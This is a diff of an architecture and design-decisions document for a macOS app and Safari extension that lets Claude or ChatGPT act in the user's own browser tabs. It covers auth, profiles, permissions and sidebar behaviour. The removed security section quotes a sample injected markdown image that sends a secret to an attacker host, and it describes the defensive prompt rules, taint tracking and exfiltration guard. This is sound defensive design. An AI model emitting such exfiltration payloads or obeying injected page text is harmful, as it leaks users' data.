@@ -1,113 +1,68 @@
-# Architecture
+# Architecture and decisions
 
-## Overview
+[README.md](../README.md) gives the system overview. This document records *why* things are built the way they are, and the evidence from this Mac: macOS 27.3, Safari 27.3, Xcode 27.
 
-```
-┌──────────────────────────── Safari ────────────────────────────┐
-│  web page ── content.js (isolated world)                        │
-│              ├─ DOM tools: a11y tree, find, click, type, …      │
-│              └─ floating panel host ── iframe panel.html        │
-│                                               (React UI)        │
-│                         ▲ scripting.executeScript │ runtime Port │
-│  background.js  ◄───────┴──────────────────────┘                │
-│   ├─ tool executor (agent-tab binding, approvals, navigation,   │
-│   │   tabs, screenshots via tabs.captureVisibleTab)             │
-│   └─ helper connection ──┐                                      │
-│  SafariAgentExtension.appex (sandboxed)                         │
-│   └─ sendNativeMessage → returns helper port + per-launch secret│
-└──────────────────────────┼──────────────────────────────────────┘
-                           │ WebSocket ws://127.0.0.1:<random port>
-                           │ (Origin must be safari-web-extension://, token auth)
-┌──────────────────────────▼─── Safari Agent.app (menu bar helper) ┐
-│ Hub: conversations (0600 JSON), runs, tool routing, approvals     │
-│ ├─ ClaudeProvider: `claude -p` stream-json session per chat ──────┼─► Claude Code CLI (user's own login)
-│ │     └─ MCP stdio server = `Safari Agent --mcp-bridge` ◄─────────┤   built-in tools disabled (--tools "")
-│ └─ ChatGPTProvider: Sign in with ChatGPT (PKCE, loopback          │
-│       callback, RS256 ID-token check, Keychain) + Responses API   ├─► api.openai.com/v1/responses (plan usage)
-│       streaming function-calling loop                             │
-└───────────────────────────────────────────────────────────────────┘
-```
+## Decisions with evidence
 
-All browser actions run in the user's **real** Safari tabs through the extension. Both providers use the same tool catalog (`extension/src/shared/tools.ts`):
-- For Claude, the catalog is exposed as MCP tools by the bridge.
-- For ChatGPT, it is sent as Responses API function tools.
-
-## Key decisions (with evidence)
-
-| Question | Finding on this machine | Decision |
+| Question | Finding | Decision |
 |---|---|---|
-| Can the Claude subscription power an agent without an API key? | `claude auth status` reports `authMethod: claude.ai`. `claude -p --input-format/--output-format stream-json` streams real answers, calls MCP tools, keeps context across turns, and accepts `control_request: interrupt` | Drive the unmodified CLI as a subprocess with a clean environment, `--tools ""`, `--strict-mcp-config`, `--setting-sources ""`, `--permission-prompts none` and our own system prompt. `--bare` is not used because it disables keychain (subscription) auth |
-| Safari MCP (`safaridriver --mcp`) | Its tools need a WebDriver session (“Allow remote automation”), and WebDriver sessions run in isolated automation windows | Not usable for the user's own tabs and logins. All tools are implemented in the extension instead |
-| Native side panel in Safari 27? | `safari-web-extension-packager` warns that `side_panel` and `persistent` are unsupported | A page-attached panel: a shadow-DOM host plus an extension iframe, a floating glass card that pushes page content. A separate window serves as fallback on pages that can't host it |
-| How does the sandboxed extension reach a non-sandboxed helper? | Native messaging only reaches the sandboxed app extension. App Groups would need a shared team container, and the design had to work with ad-hoc builds too | The helper writes `{port, token}` to `~/Library/Application Support/SafariAgent/connection.json` (0600). The appex reads it through a read-only temporary-exception entitlement and returns it to the background script, which opens an authenticated loopback WebSocket |
-| ChatGPT without an API key | SIWC docs plus the official DevKit: `dynamic_agent_client` registration, scopes `openid profile email offline_access resource.invoke chatgpt.tokens.use.direct`, loopback redirect `http://127.0.0.1:1455/auth/callback`, `GET /v1/models`, `POST /v1/responses` with `store:false, stream:true` | Implemented natively in Swift (no Node runtime): ID token verified with JWKS/RS256, tokens in the login Keychain, rotating refresh, function tools in a `namespace` with a plain-function fallback, reasoning effort with a fallback |
+| Can the Claude subscription power an agent without an API key? | `claude -p --input-format/--output-format stream-json` streams answers, calls MCP tools, resumes sessions and accepts `interrupt`; auth is `claude.ai` | Run the unmodified CLI with a clean environment, `--tools ""`, `--strict-mcp-config`, `--setting-sources ""` and Orbit's MCP bridge. The tool list follows the computer-access tier, and a tier change restarts the session with `--resume` |
+| ChatGPT without an API key | Sign in with ChatGPT (dynamic client, PKCE, loopback redirect); `POST /v1/responses` with `store:false` | Native Swift OAuth, tokens in the Keychain, Responses agent loop |
+| Native side panel in Safari 27? | `side_panel` is unsupported | Page-attached sidebar (shadow-DOM host + extension iframe) |
+| Safari MCP / WebDriver for the agent? | WebDriver sessions run in isolated automation windows | All tools run in the extension, in the user's real tabs |
+| **Which profile is an extension instance?** | `SFExtensionProfileKey` arrives with Safari's profile UUID for **non-default** profiles and is **absent for the default profile** (observed with 4 profiles) | Use Safari's UUID when present. The default profile's instance creates a random id once and keeps it in its own extension storage (separate per profile) |
+| **Profile names, icons, order** | Extensions get no profile names. Safari's container is TCC-protected. Safari 27's UI exposes them through Accessibility identifiers: `New<Name>Window?isDefaultProfile=true\|false` in File ▸ New Window, and `TabGroupPickerButton?Profile=<Name>&Icon=<SF Symbol>` on each window's profile button | Read both (opt-in Accessibility). Instances are matched to names when one of their windows gets focus (the hub hears `windows.onFocusChanged`; AX names the focused window's profile), or at once with "Match Extensions…". Placeholders `safari:<name>` stand in for profiles whose extension hasn't been matched yet; rules and logins move over when matched |
+| **Profile colors** | Not exposed through Accessibility. Stored in Safari's `SafariTabs.db` (needs Full Disk Access) | Optional read-only reader with a tolerant plist scan for colors and symbols. Without access, Orbit's colors are used |
+| **Open/focus in a profile** | Instances sleep ~30 s after use (connection log: connect … disconnect 30 s later, again at the next 1-minute alarm), so they are often unreachable. AX can raise windows and press menu items at any time | Focus through Safari's UI: the front-most window whose profile button matches, moved onto the picker's display and Space; else press "New … Window". Open URLs through the instance when it is awake, else raise the profile's window and `make new tab` via AppleScript |
+| **Keeping instances reachable** | Non-persistent background pages sleep; event listeners and alarms wake them | Listeners for windows/tabs/webNavigation/cookies, a 1-minute `alarms` keep-alive. Routing waits for the persisted config when a navigation woke the background, so it doesn't miss it |
+| **History / bookmarks / sessions** | `browser.history`, `bookmarks`, `topSites` and `sessions` are all undefined in Safari 27 (capability probe) | No history sync. Orbit doesn't write Safari's private databases either |
+| **Stopping a navigation without losing the page** | Measured with the local test site: <br>• `declarativeNetRequest` block → `onBeforeNavigate` + `onErrorOccurred` fire, but Safari shows **"Safari Can't Open the Page … blocked by a content blocker"**; the original page is gone, and Back didn't restore it. <br>• A plain navigation then `tabs.goBack` → the page was restored **with JS state** (bfcache). <br>• `window.stop()` injected on `onBeforeNavigate` → the stop lands ~20–30 ms after the start; the URL is unchanged and the JS state (counter) is kept, with server delays of 0, 150 and 600 ms | Use `window.stop()`. If the new page commits anyway, go back. No `declarativeNetRequest`. Link clicks are intercepted in the content script, which is lossless by construction |
+| **Shared logins** | `browser.cookies.getAll` returns the profile's cookies **including HttpOnly**. `cookies.set` writes them (verified: a HttpOnly `session` value changed through import); each instance sees only its own profile's single cookie store | Copy the cookies of opted-in domains from the source profile to target profiles through the instances, never persisted or logged by Orbit |
+| **App identity** | Safari keys the extension by bundle id; the Keychain ACL and data folder use the old names | Display name and product **Orbit**; bundle ids `dev.local.SafariAgent(.Extension)` and the `SafariAgent` data folder are unchanged |
 
-## Security model
+## Process and trust boundaries
 
-- **Loopback only**: the listener is bound to `127.0.0.1` with interface type loopback. Peers that aren't loopback are dropped.
-- **No web access**: WebSocket handshakes whose `Origin` is a web page are refused. Browsers always send `Origin`, so websites can't connect. Every client must also present the per-launch secret, compared in constant time. MCP bridges get a separate per-conversation token and can only call tools for their own conversation.
-- **No credential leakage**:
-  - Claude Code runs with a clean environment: no `ANTHROPIC_*` variables and no inherited host session.
-  - ChatGPT tokens live in the Keychain and are never logged. Logs (`os.Logger`) contain no prompts, page content or tokens.
-- **Untrusted content**:
-  - Tool output is wrapped in `<page_content untrusted="true">`, and the system prompt says page text is never an instruction.
-  - Markdown rendering is sanitized (DOMPurify) and drops images, so injected `![](https://evil/?q=secret)` can't exfiltrate data.
-- **Agent restrictions**:
-  - The agent refuses password, one-time-code and payment fields; their values are redacted in page snapshots.
-  - Navigation is limited to http(s).
-- **Approvals** are enforced in the extension, independent of the model:
-  - The policy (`background/policy.ts`) inspects the real element (submit buttons, sensitive labels in English and German, logout/delete links, Enter in forms, closing tabs).
-  - If no panel is open to ask, the action is denied.
-- **Tab safety**: every conversation is bound to the tab the user was viewing when they sent the message. Tools act on that tab even if the user switches tabs.
-- **Tab access scope**, enforced in the extension's executor, not by the prompt:
-  - **This tab only** (default): the agent can use only the tabs the conversation was sent from and tabs it opened itself. `tabs_list` hides all others, and explicit `tabId`s for them are refused.
-  - **All tabs in this window**: any tab in the same window.
-- **Stale references**: element refs carry a per-document id, so a ref from a previous page can never hit an element on a new page.
+```
+web page (untrusted) ──DOM──► content.js (isolated world)
+                                 │ runtime messages / executeScript RPC
+                         background.js (one per Safari profile)
+                                 │ WebSocket 127.0.0.1, token, role "extension", profile id
+                         Orbit.app hub  ◄── MCP bridge (role "mcp", per-conversation token) ◄── claude -p
+                                 │                                          ChatGPT Responses ◄─┘
+                         NativeTools (path policy, approvals)  ──►  your files (only if allowed)
+```
 
-## Reliability
+- **Origins and authentication:**
+  - The hub refuses web origins and compares tokens in constant time.
+  - Driver-only methods (`debug.agent_settings`) check the role.
+  - Folders can only be added through the native folder chooser.
+- **Where permissions are enforced:**
+  - **Browser scope and page-action approvals:** the extension's executor. Each call carries its owner profile, scope, approval mode and the exfiltration guard. Calls are isolated with `Object.create(this)`, so concurrent chats never share permissions.
+  - **Cross-profile calls:** the hub permits them only for runs with scope `all`. Approvals are relayed to the owner's panel.
+  - **Computer access:** `NativeTools` and `PathPolicy` in the app.
+- **Taint tracking:** this is per conversation and kept by the hub.
+  - Any browser tool result marks the chat "read web content", so writes ask.
+  - Any local read or command marks it "read local data", so the extension asks before typing, submitting or navigating.
 
-- **Background lifecycle**:
-  - The background script is non-persistent (MV3). Every content script says `hello` on load and when its tab becomes visible, which wakes the background and reconnects it to the helper.
-  - The panel keeps a runtime Port open and pings every 20 seconds.
-- **Per-tab sidebar**: the open state is kept per tab. The sidebar follows the agent into tabs it opens or switches to.
-- **Making room**:
-  - `html{margin-right}` pushes normal page flow.
-  - Fixed layers that reach under the sidebar are adjusted:
-    - Wide layers (at least 40 % of the viewport, e.g. app shells and headers) are pinned at their current left edge and narrowed.
-    - Small layers (buttons, widgets) are shifted left.
-  - In-flow elements that are exactly `100vw` wide are capped to the remaining width. This is what full-viewport apps like chatgpt.com need.
-  - All adjustments use `!important` inline styles that are restored exactly on close. They are re-checked on DOM mutations, on resize and every 2 seconds.
-- **Background→page calls** don't use `tabs.sendMessage`, which Safari sometimes stops delivering to a tab. Instead, `background/tabrpc.ts` runs a tiny function through `scripting.executeScript` that calls the handler the content script registered in its isolated world (`window.__safariAgentHandle`), re-injecting `content.js` when it is missing or orphaned.
-- **Stale content scripts**:
-  - After an extension reload, tabs keep orphaned scripts. Tool calls and panel-show detect missing receivers, re-inject `content.js`, and the new instance replaces the old one in the same world.
-  - Orphaned scripts remove their own dead panel.
-- **Helper**: single instance. The connection file is only removed by the instance that owns it. Keychain reads are lazy and off the main thread, so a Keychain prompt can't block startup.
-- **Claude sessions**:
-  - One `claude -p` process per conversation, idle-terminated after 15 minutes and resumed with `--resume <session_id>`.
-  - Model or effort changes restart the process with resume.
-  - Cancel sends an `interrupt` control request, killing the process after 6 seconds if needed.
-  - Auth and usage-limit errors are mapped to readable messages.
-- **ChatGPT turns**:
-  - Access tokens are refreshed 90 seconds before expiry or on a 401.
-  - Dangling function calls are closed on cancel or error.
-  - Screenshots are stripped from persisted history, and history is capped.
-- **Tool calls**: time out after 6 minutes (approvals wait up to 5). If the extension disconnects, pending calls fail with a clear error.
+## Sidebar lifecycle (after the 1.0 fixes)
 
-## Signing and installation
+1. **Host:**
+   - `content.js` runs at `document_start` and says `hello`. The background answers with the panel state for this tab.
+   - The host is appended to `<html>` (not `<body>`), with `contain: layout style`. Paint containment would cut the card's shadow at the host's rectangle. A host guard re-attaches the host if a site removes it.
+   - Re-showing never rebuilds the iframe.
+2. **Make room:**
+   - `:root{--orbit-reserve}` plus `html{margin-right: var(--orbit-reserve)}`.
+   - Fixed layers ≥ 40 % of the width are pinned (`right: var(--orbit-reserve)`). Smaller ones are shifted (`translate: calc(-1 * var(--orbit-reserve))`). In-flow `100vw` elements get `max-width: calc(100vw - var(--orbit-reserve))`.
+   - The scanner is incremental: added subtrees are walked; class/style changes check only that element. It runs in ≤ 6 ms slices, reads before it writes, and does a cheap 2 s integrity check of the adjusted layers.
+3. **Panel boot:**
+   - The host shows the card at once, but the iframe only becomes visible when the panel confirms it booted: a postMessage with a secret nonce from the frame URL, or the background seeing the panel's port for this tab.
+   - Without that confirmation within 5 s (a tab left over from an update, or a site blocking the frame), the sidebar is removed and one "Reload to use Orbit here" card appears.
+   - Note: Safari returns `iframe.src` masked (`…url://hidden/`) to content scripts, so the URL must be built once and never read back.
+   - The panel connects a runtime Port and caches the last state, so the first state can't be lost.
+   - Drafts and focus are stored per tab in the background and handed to the next page's panel.
+4. **Tools:** if the composer had focus before a page tool, `iframe.focus()` restores it right after.
+5. **Screenshots:** `captureVisibleTab`, then the sidebar area is cropped using the page's `reserve` and viewport width, then the image is downscaled (`<img>` decode + canvas in the background page).
 
-- **Signing**: `scripts/build.sh` signs with the Apple Development certificate's team (automatic signing, `-allowProvisioningUpdates`).
-  - A stable team signature makes Safari keep the extension enabled across restarts, and the Keychain keeps the helper's "Always Allow".
-  - Without a certificate, the build falls back to ad-hoc signing, which needs "Allow unsigned extensions" after every Safari launch.
-- **Copying**: builds are copied with `ditto --norsrc --noextattr --noacl`. Extended attributes break strict signature verification ("resource fork, Finder information, or similar detritus not allowed").
-- **Registration**: only one app copy is registered with LaunchServices: the installed one in `~/Applications`, or `build/` if nothing is installed.
+## Reference archive
 
-## Reference archive: what was reused conceptually
-
-The archive (`Chrome-Extensions/`) was used read-only as a reference. No code, assets or keys were copied.
-
-- **Claude in Chrome 1.0.107**: MV3 service worker, Chrome `sidePanel`, `debugger` (CDP input), `tabGroups`, `nativeMessaging`, and an `accessibility-tree.js` content script that builds a ref-addressed tree with `WeakRef` maps and redacts sensitive fields.
-  - Reused ideas: the ref-addressed accessibility tree (reimplemented in `content/dom-tools.ts` with per-document ref ids), sensitive-field redaction, the find-by-description approach, the agent visual indicator, and tool names close to Claude in Chrome's (`read_page`, `find`, `form_input`, `navigate`, `get_page_text`).
-  - New for Safari: Safari has no `sidePanel`, no `debugger`/CDP and no `tabGroups`, and its native messaging only reaches the app extension. Input is therefore synthesized in the DOM (pointer, mouse and keyboard events, native value setters, `execCommand` for contenteditable). Tab scoping uses agent-tab binding instead of a tab group. The model connection goes through a local helper.
-- **ChatGPT extension 1.26**: an MV3 side panel (`codex-work-sidepanel`), browser-accessibility chunks and a localhost connector to a desktop app.
-  - Reused idea: talk to a local native process over loopback instead of running the agent in the browser.
-  - Not reused: web-session (chatgpt.com) endpoints. Sign in with ChatGPT plus the public Responses API is used instead.
+`Chrome-Extensions/` (Claude in Chrome 1.0.107, ChatGPT extension 1.26) was used read-only for concepts in 0.1.0. Nothing was copied, and the folder is excluded from the repository.
